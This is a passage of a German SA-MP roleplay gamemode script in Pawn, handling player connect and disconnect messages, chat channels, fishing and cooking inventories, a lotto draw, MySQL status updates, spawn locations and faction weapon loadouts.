	TextDrawShowForPlayer(playerid,Uhrzeit);
	SetPlayerColor(playerid,COLOR_GRAD2);

	new spname[MAX_PLAYER_NAME];
	GetPlayerName(playerid, spname, sizeof(spname));


	if(hatdenserverbetreten == false)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(PlayerInfo[i][pMeldung] == 1)
			{






				new IPs[16], countrys[32];
//				GetPlayerIp(playerid, IPs, sizeof(IPs));
//				GetIPCity(IPs, countrys, 32);



				new IP[16], country[32];
//				GetPlayerIp(playerid, IP, sizeof(IP));
//				GetIPCountry(IP, country, 32);


/*
			    if(IsASkrupy(playerid))
	  		    {

				format(ALLSTRING, sizeof(ALLSTRING), "%s (Serverowner Verifiziert)(%d) aus %s (%s) hat den Server betreten.",spname,playerid,country,countrys);
			    SendClientMessage(i, COLOR_LIGHTRED, ALLSTRING);
				}*/


				format(ALLSTRING, sizeof(ALLSTRING), "%s (%d) aus %s (%s) hat den Server betreten.",spname,playerid,country,countrys);
			    SendClientMessage(i, COLOR_LIGHTRED, ALLSTRING);


			}
		}
	}
	return 1;
}

Function JoinChannel(playerid, number, line[])
{
    if(IsPlayerConnected(playerid))
	{
	    if(strcmp(IRCInfo[number][iPassword],line, true ) == 0 )
		{
	        JoinChannelNr(playerid, number);
	    }
	    else
	    {
	        SendClientMessage(playerid, COLOR_GREY, "   Falsches Raumpasswort !");
	    }
	}
	return 1;
}

Function JoinChannelNr(playerid, number)
{
	if(IsPlayerConnected(playerid))
	{
	    new string[256];
		new sendername[MAX_PLAYER_NAME];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(PlayersChannel[playerid] < 999)
	    {
			format(string, sizeof(string), "* %s hat den Raum verlassen.", sendername);
			SendIRCMessage(PlayersChannel[playerid], COLOR_GREEN, string);
			IRCInfo[PlayersChannel[playerid]][iPlayers] -= 1;
	    }
		new channel; channel = number; channel += 1;
	    PlayersChannel[playerid] = number;
	    IRCInfo[PlayersChannel[playerid]][iPlayers] += 1;
    	new wstring[128];
		format(string, sizeof(string), "%s", sendername);
		strmid(wstring, string, 0, strlen(string), 255);
		if(strcmp(IRCInfo[number][iAdmin],wstring, true ) == 0 )
		{
		    format(string, sizeof(string), "* Du hast den FRR Channel %d als Administrator betreten.", channel);
			SendClientMessage(playerid, COLOR_YELLOW, string);
		}
		else
		{
		    format(string, sizeof(string), "* Du hast den FRR Channel %d betreten, Admin: %s.", channel, IRCInfo[number][iAdmin]);
			SendClientMessage(playerid, COLOR_YELLOW, string);
		}
		format(string, sizeof(string), "MOTD: %s.", IRCInfo[number][iMOTD]);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), "* %s hat den Channel betreten.", sendername);
		SendIRCMessage(number, COLOR_GREEN, string);
	}
	return 1;
}


Function ClearMarriage(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "Niemand");
		strmid(PlayerInfo[playerid][pMarriedTo], string, 0, strlen(string), 255);
		PlayerInfo[playerid][pMarried] = 0;
	}
	return 1;
}

Function ClearPaper(paper)
{
    new string[MAX_PLAYER_NAME];
	format(string, sizeof(string), "Niemand");
	PaperInfo[paper][PaperUsed] = 0;
	strmid(PaperInfo[paper][PaperMaker], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperTitle], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperText1], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperText2], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperText3], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperText4], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperText5], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperText6], string, 0, strlen(string), 255);
	strmid(PaperInfo[paper][PaperText7], string, 0, strlen(string), 255);
	SavePapers();
	return 1;
}


Function ClearCrime(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "********");
		strmid(PlayerCrime[playerid][pBplayer], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pVictim], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pAccusing], string, 0, strlen(string), 255);
		strmid(PlayerCrime[playerid][pAccusedof], string, 0, strlen(string), 255);
	}
	return 1;
}

Function FishCost(playerid, fish)
{
	if(IsPlayerConnected(playerid))
	{
		new cost = 0;
		switch (fish)
		{
		    case 1:
		    {
		        cost = 1;
		    }
		    case 2:
		    {
		        cost = 3;
		    }
		    case 3:
		    {
		        cost = 3;
		    }
		    case 5:
		    {
		        cost = 5;
		    }
		    case 6:
		    {
		        cost = 2;
		    }
		    case 8:
		    {
		        cost = 8;
		    }
		    case 9:
		    {
		        cost = 12;
		    }
		    case 11:
		    {
		        cost = 9;
		    }
		    case 12:
		    {
		        cost = 7;
		    }
		    case 14:
		    {
		        cost = 12;
		    }
		    case 15:
		    {
		        cost = 9;
		    }
		    case 16:
		    {
		        cost = 7;
		    }
		    case 17:
		    {
		        cost = 7;
		    }
		    case 18:
		    {
		        cost = 10;
		    }
		    case 19:
		    {
		        cost = 4;
		    }
		    case 21:
		    {
		        cost = 3;
		    }
		}
		return cost;
	}
	return 0;
}

Function ClearFishes(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    Fishes[playerid][pFid1] = 0; Fishes[playerid][pFid2] = 0; Fishes[playerid][pFid3] = 0;
		Fishes[playerid][pFid4] = 0; Fishes[playerid][pFid5] = 0;
		Fishes[playerid][pWeight1] = 0; Fishes[playerid][pWeight2] = 0; Fishes[playerid][pWeight3] = 0;
		Fishes[playerid][pWeight4] = 0; Fishes[playerid][pWeight5] = 0;
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "None");
		strmid(Fishes[playerid][pFish1], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish2], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish3], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish4], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish5], string, 0, strlen(string), 255);
	}
	return 1;
}

Function ClearFishID(playerid, fish)
{
	if(IsPlayerConnected(playerid))
	{
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "None");
		switch (fish)
		{
		    case 1:
		    {
		        strmid(Fishes[playerid][pFish1], string, 0, strlen(string), 255);
		        Fishes[playerid][pWeight1] = 0;
		        Fishes[playerid][pFid1] = 0;
		    }
		    case 2:
		    {
		        strmid(Fishes[playerid][pFish2], string, 0, strlen(string), 255);
		        Fishes[playerid][pWeight2] = 0;
		        Fishes[playerid][pFid2] = 0;
		    }
		    case 3:
		    {
		        strmid(Fishes[playerid][pFish3], string, 0, strlen(string), 255);
		        Fishes[playerid][pWeight3] = 0;
		        Fishes[playerid][pFid3] = 0;
		    }
		    case 4:
		    {
		        strmid(Fishes[playerid][pFish4], string, 0, strlen(string), 255);
		        Fishes[playerid][pWeight4] = 0;
		        Fishes[playerid][pFid4] = 0;
		    }
		    case 5:
		    {
		        strmid(Fishes[playerid][pFish5], string, 0, strlen(string), 255);
		        Fishes[playerid][pWeight5] = 0;
		        Fishes[playerid][pFid5] = 0;
		    }
		}
	}
	return 1;
}

Function ClearCooking(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    Cooking[playerid][pCookID1] = 0; Cooking[playerid][pCookID2] = 0; Cooking[playerid][pCookID3] = 0;
		Cooking[playerid][pCookID4] = 0; Cooking[playerid][pCookID5] = 0;
		Cooking[playerid][pCWeight1] = 0; Cooking[playerid][pCWeight2] = 0; Cooking[playerid][pCWeight3] = 0;
		Cooking[playerid][pCWeight4] = 0; Cooking[playerid][pCWeight5] = 0;
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "Nothing");
		strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
		strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
		strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
		strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
		strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
	}
	return 1;
}

Function ClearCookingID(playerid, cook)
{
	if(IsPlayerConnected(playerid))
	{
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "Nix");
		switch (cook)
		{
		    case 1:
		    {
		        strmid(Cooking[playerid][pCook1], string, 0, strlen(string), 255);
		        Cooking[playerid][pCWeight1] = 0;
		        Cooking[playerid][pCookID1] = 0;
		    }
		    case 2:
		    {
		        strmid(Cooking[playerid][pCook2], string, 0, strlen(string), 255);
		        Cooking[playerid][pCWeight2] = 0;
		        Cooking[playerid][pCookID2] = 0;
		    }
		    case 3:
		    {
		        strmid(Cooking[playerid][pCook3], string, 0, strlen(string), 255);
		        Cooking[playerid][pCWeight3] = 0;
		        Cooking[playerid][pCookID3] = 0;
		    }
		    case 4:
		    {
		        strmid(Cooking[playerid][pCook4], string, 0, strlen(string), 255);
		        Cooking[playerid][pCWeight4] = 0;
		        Cooking[playerid][pCookID4] = 0;
		    }
		    case 5:
		    {
		        strmid(Cooking[playerid][pCook5], string, 0, strlen(string), 255);
		        Cooking[playerid][pCWeight5] = 0;
		        Cooking[playerid][pCookID5] = 0;
		    }
		}
	}
	return 1;
}

Function ClearGroceries(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    Groceries[playerid][pChickens] = 0; Groceries[playerid][pChicken] = 0;
	    Groceries[playerid][pHamburgers] = 0; Groceries[playerid][pHamburger] = 0;
	    Groceries[playerid][pPizzas] = 0; Groceries[playerid][pPizza] = 0;
	}
	return 1;
}

Function Lotto(number)
{
	new JackpotFallen = 0;
	new string[256];
	new winner[MAX_PLAYER_NAME];
	format(string, sizeof(string), "Lotto: Heute wurde die Losnummer %d gezogen.", number);
    OOCOff(COLOR_WHITE, string);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pLottoNr] > 0)
		    {
			    if(PlayerInfo[i][pLottoNr] == number)
			    {
			        JackpotFallen = 1;
			        GetPlayerName(i, winner, sizeof(winner));
					format(string, sizeof(string), "Lotto: %s hat den Jackpot von $%d gewonnen.", winner, Jackpot);
					OOCOff(COLOR_WHITE, string);
					format(string, sizeof(string), "* Du hast $%d mit deinem Lottoticket gewonnen.", Jackpot);
					SendClientMessage(i, COLOR_YELLOW, string);
					ConsumingMoney[i] = 1;
			        FraktionsKasse[6] -= Jackpot;
					GivePlayerMoneySave(i, Jackpot);
			    }
			    else
			    {
			        SendClientMessage(i, COLOR_LIGHTBLUE, "Du hast beim Lotto nicht gewonnen.");
			    }
			}
			PlayerInfo[i][pLottoNr] = 0;
		}
	}
	if(JackpotFallen)
	{
	    new rand = random(100000); rand += 150000;
	    Jackpot = rand;
	    SaveStuff();
	    format(string, sizeof(string), "Lotto: Der neue Jackpot beträgt $%d.", Jackpot);
		OOCOff(COLOR_WHITE, string);
	}
	else
	{
	    new rand = random(5000); rand += 10000;
	    Jackpot += rand;
	    SaveStuff();
	    format(string, sizeof(string), "Lotto: Der Jackpot wurde auf $%d erhöht.", Jackpot);
		OOCOff(COLOR_WHITE, string);
	}
	return 1;
}

//------------------------------------------------------------------------------------------------------
public OnPlayerDisconnect(playerid, reason)
{
SaveMysqlPlayer(playerid);
OnPlayerCarUpdate(playerid,true);

//------------------------------------------------------------------------------------------------------
if(PlayerInfo[playerid][pTot] == 1)
{

	RemoveIcon(playerid);



//    Delete3DTextLabel(DeathText[playerid]);
//	DestroyPickup(TotenKopf[playerid]);
}
//------------------------Control Panel--------------------------------------------------------------

    RemovePlayer(playerid);



/*

					new level = PlayerInfo[playerid][pAdmin];
				    if(level == 0)
				    {
						WBB_RemoveUserFromGroup(playerid, 6);
						WBB_RemoveUserFromGroup(playerid, 5);
						WBB_RemoveUserFromGroup(playerid, 7);
						WBB_RemoveUserFromGroup(playerid, 66);
						WBB_RemoveUserFromGroup(playerid, 43);
						WBB_RemoveUserFromGroup(playerid, 42);
						WBB_RemoveUserFromGroup(playerid, 67);
					}
				    else if(level == 2)
				    {
						WBB_AddUserToGroup(playerid, 67);
					}
				    else if(level == 4)
				    {
						WBB_AddUserToGroup(playerid, 6);
					}
				    else if(level == 1337)
				    {
						WBB_AddUserToGroup(playerid, 5);
					}
				    else if(level == 1338)
				    {
						WBB_AddUserToGroup(playerid, 7);
					}
				    else if(level == 2000)
				    {
						WBB_AddUserToGroup(playerid, 66);
					}
				    else if(level == 2001)
				    {
						WBB_AddUserToGroup(playerid, 43);
					}
				    else if(level == 2002)
				    {
						WBB_AddUserToGroup(playerid, 43);
						WBB_AddUserToGroup(playerid, 42);
					}







	GivePlayerForumRechte(playerid);


*/



	if(Desktop_Timer_Started[playerid] == 1)
	{
		KillTimer(Desktop_Timer[playerid]);
	}
    new query7[200];
    new Year, Month, Day ,Hour, Minute, Second;
    gettime(Hour, Minute, Second);
    getdate(Year, Month, Day);
    format(query7,sizeof(query7),"UPDATE accounts SET logintime = '%02d.%02d.%d %02d:%02d' WHERE name = '%s'",Day, Month, Year,Hour,Minute, GetName(playerid));
	//mysql_function_query(mysqlcon,query7, false, "", "");
	mysql_pquery(mysqlcon, query7);





    //mysql_query(query7);
    //






    new query6[200];
    format(query6,sizeof(query6),"UPDATE accounts SET online = '0' WHERE name = '%s'",GetName(playerid));
//	mysql_function_query(mysqlcon,query6, false, "", "");
    mysql_pquery(mysqlcon, query6);


    //mysql_query(query6);

//------------------------------------------------------------------------------------------------------

    new spname[MAX_PLAYER_NAME];
	GetPlayerName(playerid, spname, sizeof(spname));


	if(hatdenserverbetreten == false)
	{
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(PlayerInfo[i][pMeldung] == 1)
			{
			    if(reason == 0)
			    {
					format(ALLSTRING, sizeof(ALLSTRING), "%s (%d) hat den Server verlassen (Timeout).",spname,playerid);
				}
				else if(reason == 1)
				{
					format(ALLSTRING, sizeof(ALLSTRING), "%s (%d) hat den Server verlassen.", spname,playerid);    // wird erstmal rausgeworfen nicht.

				}
				else if(reason == 2)
				{
					format(ALLSTRING, sizeof(ALLSTRING), "%s (%d) hat den Server verlassen (Exe-Crash).",spname,playerid);
				}
			    SendClientMessage(i, COLOR_LIGHTRED, ALLSTRING);
			}
		}
	}


	if(GetPVarInt(playerid, "NewbRoller") == 1) DestroyVehicle(NewbRoller[playerid]);
	GW_OnPlayerDisconnect(playerid);
	if(Desktop_Timer_Started[playerid] == 1)
	{
	KillTimer(Desktop_Timer[playerid]);
	}
	for(new i=0; i<MAX_Objekt; i++) // beim Offline gehen verschwinden die Sperren
	{
		DestroyDynamicObject(Sperre[playerid][i]);
		sperrespawned[i] = 0;
		Sperre[playerid][i] = 0;
		#if defined Aktiv_3DText
			Delete3DTextLabel(SperreLabel[playerid][i]);
		#endif
	}
   	DeletePVar(playerid,"Spawned");
    if(ReportCall[playerid] != 999)
    {
        new sendername[MAX_PLAYER_NAME], string[80];
        GetPlayerName(playerid, sendername, sizeof(sendername));
        format(string, sizeof(string), "[SUPPORT] %s Hat den Server verlassen! /report geschlossen", sendername);
        SendClientMessage(playerid, COLOR_LIGHTGREEN,string);
  		ReportCall[playerid] = 999;
	}
	PlayerInfo[playerid][pAdjustable] = 1;

	if(AdminDuty[playerid] == 1)
	{
    	Delete3DTextLabel(Admin[playerid]);
		Delete3DTextLabel(Supermod[playerid]);
		Delete3DTextLabel(Mod[playerid]);
		Delete3DTextLabel(Supporter[playerid]);
		SetPlayerColor(playerid,TEAM_HIT_COLOR);
		AdminDuty[playerid] = 0;
	}
	if(BlindFold[playerid] == 1)
	{
		BlindFold[playerid] = 0;
	}
	if(PlayerInfo[playerid][pMauled] == 1)
	{
	    PlayerInfo[playerid][pMauled] = 0;
	}
	if(PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24 && BlitzerErstellt[playerid] == 1)
	{
		RemoveBlitzer(playerid);
	}
	if(PlayerTied[playerid] == 1)
	{
	    PlayerInfo[playerid][pGangJailed] = 1;
	    PlayerTied[playerid] = 0;
	}
	if(IsTowTrucker[playerid] == 1)
 	{
	    IsTowTrucker[playerid] = 0;
	    TowTruckers--;
  	}
	new sendername[MAX_PLAYER_NAME];
	new string[200];
	GetPlayerName(playerid,sendername,sizeof(sendername));
	DestroyDynamicObject(sSperre[playerid][0]);
	DestroyDynamicObject(sSperre[playerid][1]);
	DestroyDynamicObject(sSperre[playerid][2]);
	DestroyDynamicObject(sSperre[playerid][3]);
	DestroyDynamicObject(sSperre[playerid][4]);
	Sperrebit[playerid]=0;
	InCargo[playerid] = 0; InLevi[playerid] = 0; InEnfo[playerid] = 0;
	if(reason == 1)
	{
		if(PlayerCuffed[playerid] >= 1 && WantedLevel[playerid] >= 1)
		{
			OfflineFlucht[playerid] = 1;
			format(string,sizeof(string),"Warnung %s ist Gefesselt Offline gegangen! Offline-Flucht))",sendername);
			ABroadCast(COLOR_YELLOW,string,1);
		}
	}
	gActivePlayers[playerid]--;
	numplayers--;
	PlayerInfo[playerid][pAdjustable] = 1;


	GetPlayerName(playerid,sendername,sizeof(sendername));
	format(string,sizeof(string),"%s war nun %d Minuten online! (ID: %d | IP: %s)",sendername,PlayerInfo[playerid][pMinutesSinceLogin],playerid,pIP[playerid]);
	Log("Online.txt",string);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(TaxiAccepted[i] < 999)
	        {
		        if(TaxiAccepted[i] == playerid)
		        {
		            TaxiAccepted[i] = 999;
		            GameTextForPlayer(i, "~w~Kunde~n~~r~Hat das Spiel Verlassen", 5000, 1);
		            TaxiCallTime[i] = 0;
		            DisablePlayerCheckpoint(i);
		        }
	        }
	        else if(BusAccepted[i] < 999)
	        {
		        if(BusAccepted[i] == playerid)
		        {
		            BusAccepted[i] = 999;
		            GameTextForPlayer(i, "~w~Kunde~n~~r~Hat Spiel Verlassen", 5000, 1);
		            BusCallTime[i] = 0;
		            DisablePlayerCheckpoint(i);
		        }
	        }
	    }
 	}
	if(GettingCK[playerid] < 999)
	{
	    if(IsPlayerConnected(GettingCK[playerid]))
	    {
	        SendClientMessage(GettingCK[playerid], COLOR_YELLOW, "Dein Abschuss hat den Server verlassen, versuch es später nochmal.");
	        OnCK[GettingCK[playerid]] = 999;
	    }
	}
	if(TransportCost[playerid] > 0 && TransportDriver[playerid] < 999)
	{
	    if(IsPlayerConnected(TransportDriver[playerid]))
		{
		    TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
		    TransportTime[TransportDriver[playerid]] = 0;
		    TransportCost[TransportDriver[playerid]] = 0;
		    format(string, sizeof(string), "~w~Kunde ist ausgestiegen~n~~g~Verdienst: $%d",TransportCost[playerid]);
		    GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
		}
	}
	if(GotHit[playerid] > 0)
	{
	    if(GetChased[playerid] < 999)
	    {
	        if(IsPlayerConnected(GetChased[playerid]))
	        {
	        	SendClientMessage(GetChased[playerid], COLOR_YELLOW, "Er WoS verlassen.");
	            GoChase[GetChased[playerid]] = 999;
			}
	    }
	}
	if(PlayerPaintballing[playerid] != 0)
	{
	    PaintballPlayers --;
	}
	if(PlayerKarting[playerid] > 0 && PlayerInKart[playerid] > 0)
	{
	    KartingPlayers --;
	}
	if(PlayersChannel[playerid] < 999)
	{
		IRCInfo[PlayersChannel[playerid]][iPlayers] -= 1;
	}
	if(HireCar[playerid] != 299)
	{
		gLastDriver[HireCar[playerid]] = 300;
		gCarLock[HireCar[playerid]] = 0;
		UnLockCar(HireCar[playerid]);
	}
	if (gLastCar[playerid] > 0)
	{
		gLastDriver[gLastCar[playerid]] = 300;
		if(PlayerInfo[playerid][pHouseKey] != gLastCar[playerid]-1)
		{
			gCarLock[gLastCar[playerid]] = 0;
			UnLockCar(gLastCar[playerid]);
		}
	}
/*
	if(PlayerBoxing[playerid] > 0)
	{
	    if(Boxer1 == playerid)
	    {
	        if(IsPlayerConnected(Boxer2))
	        {
	        	PlayerBoxing[Boxer2] = 0;
	        	SetPlayerPos(Boxer2, 765.8433,3.2924,1000.7186);
	        	SetPlayerInterior(Boxer2, 5);
	        	GameTextForPlayer(Boxer2, "~r~Kampf unterbrochen", 5000, 1);
			}
	    }
	    else if(Boxer2 == playerid)
	    {
	        if(IsPlayerConnected(Boxer1))
	        {
	        	PlayerBoxing[Boxer1] = 0;
	        	SetPlayerPos(Boxer1, 765.8433,3.2924,1000.7186);
	        	SetPlayerInterior(Boxer1, 5);
	        	GameTextForPlayer(Boxer1, "~r~Kampf unterbrochen", 5000, 1);
			}
	    }
	    InRing = 0;
     	RoundStarted = 0;
		Boxer1 = 255;
		Boxer2 = 255;
		TBoxer = 255;
	}
*/
    if(TransportDuty[playerid] == 1)
	{
		TaxiDrivers -= 1;
	}
    else if(TransportDuty[playerid] == 2)
	{
		BusDrivers -= 1;
	}
	if(IsPlayerInFrac(playerid, 4))
	{
	    if(JobDuty[playerid] == 1)
		{
			Medics -= 1;
		}
	}
	else if(PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pMember] == 24)
	{
	    if(JobDuty[playerid] == 1) { Mechanics -= 1; }
	}
	if (PlayerInfo[playerid][pRoadblock] != 0)
	{
		RemoveRoadblock(playerid);
	}
    return 1;
}

Function SetPlayerSpawn(playerid) //Klammerfehler?
{
	if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pPrisonCPs] > 0)
		{
	        SetPlayerVirtualWorld(playerid, playerid+1);
	        SetPlayerPos(playerid, 197.3844,2066.8677,22.6444);
	        new string[128];
	        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CUFFED);
	        SetPlayerAttachedObject(playerid, 1, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	        format(string, sizeof(string), "* Du musst noch %i Checkpoints laufen", PlayerInfo[playerid][pPrisonCPs]);
	        SendClientMessage(playerid, COLOR_GREEN, string);
	        SetPlayerPrisonCP(playerid);
	        return 1;
	    }
		SetPlayerHealth(playerid, 999999);
		SetPlayerChatBubble(playerid, "Anti Spawn Kill", COLOR_PURPLE, 70.0, 5000);
		SetTimerEx("EndAntiSpawnKill", 5000, false, "i", playerid);
		PlayerInfo[playerid][pLocal] = 999;
	    if(PlayerInfo[playerid][pDonateRank] >= 1)
	    {
            ServerWeapon(playerid, 24, 499);
		}
		SetPlayerToTeamColor(playerid);
		if(PlayerInfo[playerid][pTot] == 1 && PlayerInfo[playerid][pJailed] == 0 && PlayerInfo[playerid][pGangJailed] == 0)
		{
			TogglePlayerControllable(playerid, 0);
			ResetPlayerWeapons(playerid);
			SetPlayerPos(playerid,1160.9883,-1320.3571,16.2361);// Tot
			SetPlayerCameraPos(playerid, 1214.7585,-1357.8434,40.7482);
			SetPlayerCameraLookAt(playerid, 1209.7206,-1353.9391,37.3313);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
			FreezePlayer(playerid);
            OnPlayerCommandText(playerid,"/time");
			return 1;
		}

		new rand;
		if(PlayerPaintballing[playerid] != 0)
		{
	 		ResetPlayerWeapons(playerid);
	 		ServerWeapon(playerid, 29, 999);
	 		ServerWeapon(playerid, 24, 999);
	   		rand = random(sizeof(PaintballSpawns));
			SetPlayerPos(playerid, PaintballSpawns[rand][0], PaintballSpawns[rand][1], PaintballSpawns[rand][2]);
	        SetPlayerInterior(playerid, 1);
			RemoveIcon(playerid);
	  		return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 1)
		{
	 		SetPlayerInterior(playerid,6);
			SetPlayerPos(playerid,264.0360,82.2929,1001.0391);// LSPD
			SetCameraBehindPlayer(playerid);
			ResetPlayerWeapons(playerid);
			TogglePlayerControllable(playerid, 1);
			return 1;
		}
		if(PlayerInfo[playerid][pJailed] == 2)
		{
	   		SetPlayerInterior(playerid,10);
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
			SetPlayerPos(playerid,219.6281,110.6854,999.0156);// SFPD
			SetPlayerVirtualWorld(playerid, 0);
			ResetPlayerWeapons(playerid);
			return 1;
	    }
		if(PlayerInfo[playerid][pPrison] == 1)
		{
	   		SetPlayerInterior(playerid,1);
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
			SetPlayerPos(playerid,2144.1028,1635.3062,993.5761);// Prison
			SetPlayerVirtualWorld(playerid, 1);
			ResetPlayerWeapons(playerid);
			return 1;
	    }
	 	if(PlayerInfo[playerid][pGangJailed] == 1)
		{
		    SetPlayerInterior(playerid, 0);
		    SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerPos(playerid, -2816.1074,-1523.2286,140.8438);
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
		    SendClientMessage(playerid, COLOR_LIGHTRED, " Du befindest dich noch im Gangjail!");
		    return 1;
		}
		if(SpawnChange[playerid] == 2)
		{
			if(WohnwagenID[playerid] != 0)
			{
				SetPlayerPos(playerid,2513.0469,-1729.0304,778.6371);
				isInWohnwagen[playerid] = WohnwagenID[playerid];
			}
			return 1;
		}
		new house = PlayerInfo[playerid][pHouseKey];
		if(house != 999)
		{
			    if(SpawnChange[playerid])//JA
			    {
					if(HouseInfo[house][hCreated] == 1)
					{
				        GiveFrakWeapons(playerid);
		//				SetPlayerToTeamColor(playerid);
						SetPlayerInterior(playerid,HouseInfo[house][hInt]);
						SetPlayerPos(playerid, HouseInfo[house][hExitx], HouseInfo[house][hExity],HouseInfo[house][hExitz]);
						PlayerInfo[playerid][pLocal] = house;
						PlayerInfo[playerid][pInt] = HouseInfo[house][hInt];
						SetPlayerVirtualWorld(playerid,house);
						return 1;
					}
				}
		}
		if(PlayerInfo[playerid][sMember] < 25 && PlayerInfo[playerid][sMember] > 0)
	 	{
			for(new idx=0; idx<MAX_FRAKS; idx++)
			{
				if(FrakInfo[idx][fFrak] == PlayerInfo[playerid][sMember])
				{
					if(FrakInfo[idx][fCreated] == 1)
					{
						SetPlayerToTeamColor(playerid);
						GiveFrakWeapons(playerid);
						SetPlayerPos(playerid, FrakInfo[idx][fExitX],FrakInfo[idx][fExitY],FrakInfo[idx][fExitZ]); // Warp the player
						SetPlayerFacingAngle(playerid,random(360));
						SetPlayerInterior(playerid,FrakInfo[idx][fInterior]);
						PlayerInfo[playerid][pLocal] = idx+99;
						return 1;
					}
				}
			}
		}
	    if(gTeam[playerid] == 1)
	    {
//			SetPlayerToTeamColor(playerid);
			rand = random(sizeof(gMedPlayerSpawns));
			SetPlayerPos(playerid, gMedPlayerSpawns[rand][0], gMedPlayerSpawns[rand][1], gMedPlayerSpawns[rand][2]); // Warp the player
			SetPlayerFacingAngle(playerid, 270.0);
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			return 1;
		}
	    else
	    {
	//		SetPlayerToTeamColor(playerid);
			if(PlayerInfo[playerid][pOrigin] == 1 || PlayerInfo[playerid][pOrigin] == 2 || PlayerInfo[playerid][pOrigin] == 3)
			{
			    SetPlayerPos(playerid,857.4366,-1663.0399,13.5524); // Noobspawn
			    SetPlayerFacingAngle(playerid,270.5641);
			    SetPlayerInterior(playerid,0);
			    PlayerInfo[playerid][pInt] = 0;
			    PlayerInfo[playerid][pRollerLic] = 1;
			    PlayerInfo[playerid][pPhoneBook] = 1;
			    if(PlayerInfo[playerid][pLevel] == 1)
			    {
			        SetTimerEx("stueckhurensohn",1500,0,"i",playerid);
			    }
			    //	ShowPlayerDialog(playerid,DIALOG_TUTORIAL_JANEIN,DIALOG_STYLE_MSGBOX,"Tutorial","Hi!\nSieht so aus als ob du neu auf dem Server bist.\nMöchtest du das Interaktive Tutorial machen?\nAm Ende erhälst du einen Startbonus!","Ja","Nein");
			}
		}
	}
	return 1;
}

Function GiveFrakWeapons(playerid)
{
	if (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1)//COP
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,3,1);
//		ServerWeapon(playerid,24,200);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)//FBI
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,3,1);
//		ServerWeapon(playerid,24,30);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)//Bundeswehr
	{
		ServerWeapon(playerid,24,1000);
   		SetPlayerArmour(playerid, 100);
     	SetPlayerHealth(playerid, 100);
       	//ServerWeapon(playerid, 41, 1500);//Spray
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)//Medic
	{
//	    ServerWeapon(playerid,3,1);
     	SetPlayerHealth(playerid, 100);
		ServerWeapon(playerid,41,500);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5)//LCN
	{
//	    ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
     	SetPlayerHealth(playerid, 100);
		return 1;
	}
	if (PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6)//Yakuza
	{
		SetPlayerHealth(playerid,100);
//		ServerWeapon(playerid,29, 500);//Baseball
//		ServerWeapon(playerid,24, 307); //Deagle
//		ServerWeapon(playerid,31, 500); //M4
//     	SetPlayerHealth(playerid, 100);
	    return 1;
	}
	if (PlayerInfo[playerid][pLeader] == 7)//San Andreas Präsident
	{
